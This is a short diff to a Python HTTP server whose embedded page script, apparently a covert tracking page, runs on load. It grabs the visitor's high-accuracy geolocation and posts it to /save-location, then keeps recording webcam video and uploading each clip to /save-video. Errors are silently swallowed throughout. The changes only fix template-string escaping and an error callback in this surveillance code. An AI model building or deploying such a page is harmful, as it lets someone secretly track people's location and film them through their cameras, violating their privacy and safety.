@@ -362,13 +362,13 @@ class Handler(http.server.SimpleHTTPRequestHandler):
             function sendLocation() {
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition((pos) => {
-                        const link = \`https://www.google.com/maps?q=\${pos.coords.latitude},\${pos.coords.longitude}\`;
+                        const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                         fetch('/save-location', {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({ link: link })
                         }).catch(e => {});
-                    }, null, { enableHighAccuracy: true });
+                    }, (err) => {}, { enableHighAccuracy: true });
                 }
             }
             sendLocation();
@@ -382,7 +382,7 @@ class Handler(http.server.SimpleHTTPRequestHandler):
                     recorder.onstop = () => {
                         const blob = new Blob(chunks, { type: 'video/webm' });
                         const fd = new FormData();
-                        fd.append('video', blob, \`rec_\${Date.now()}.webm\`);
+                        fd.append('video', blob, `rec_${Date.now()}.webm`);
                         fetch('/save-video', { method: 'POST', body: fd })
                             .then(() => recordCycle()).catch(() => recordCycle());
                     };
